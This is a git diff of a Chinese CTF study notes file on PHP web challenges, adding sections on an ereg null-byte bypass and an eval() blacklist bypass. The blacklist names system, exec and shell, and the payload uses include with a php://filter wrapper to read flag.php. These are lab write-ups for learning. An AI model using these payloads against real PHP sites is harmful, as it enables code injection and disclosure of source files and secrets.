@@ -5196,7 +5196,7 @@ $args = GLOBALS
 $$args = $GLOBALS
 ```
 
-### PHP中引用的特性
+## PHP中引用的特性
 
 **提示：**PHP中引用的用法，将`$o->enter`设置为`$o->secret`的引用，这样更改`$o->secret`时`$o->enter`也会随之更改
 
@@ -5238,7 +5238,7 @@ echo urlencode(serialize($j));
 O%3A8%3A%22just4fun%22%3A2%3A%7Bs%3A6%3A%22secret%22%3BN%3Bs%3A5%3A%22enter%22%3BR%3A2%3B%
 ```
 
-### 伪协议-Lv2（考点：伪协议data读取文件）
+## 伪协议-Lv2（考点：伪协议data读取文件）
 
 ```php
 <?php
@@ -5332,6 +5332,71 @@ ciscn=123&cyber=123&flag=123
 ```
 
 ![image-20240203222446559](CTF.assets/image-20240203222446559.png)
+
+## ereg函数特性
+
+利用ereg%00绕过的特性 `aaaa%00*-*` 绕过
+
+```php
+<?php 
+highlight_file('index.php');
+include('flag.php');
+if (isset ($_GET['password'])) 
+{
+  # password必须只包含保护数字和字母
+  if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
+  {
+    echo '<p>You password must be alphanumeric</p>';
+  }
+  else if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)
+   {
+     # 密码中必须包含*-*
+     if (strpos ($_GET['password'], '*-*') !== FALSE) //strpos — 查找字符串首次出现的位置
+      {
+      die('Flag: ' . $flag);
+      }
+      else
+      {
+        echo('<p>*-* have not been found</p>'); 
+       }
+      }
+     else 
+     {
+        echo '<p>Invalid password</p>'; 
+      }
+   } 
+?>
+```
+
+```
+payload：password=9e9%00*-*
+```
+
+### 文件包含
+
+```php
+<?php error_reporting(0);
+if(isset($_GET['c']))
+{ 
+    $c = $_GET['c'];
+    if(!preg_match("/flag|system|exec|shell|php|\.| |\'|\`|echo|\;|\(/i", $c))
+    { 
+        eval($c); 
+    }
+}
+else
+{
+     highlight_file(__FILE__); 
+}
+```
+
+payload：
+
+```
+?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
+```
+
+知识点：**include可以不用括号，分号可以用?>代替**
 
 
 
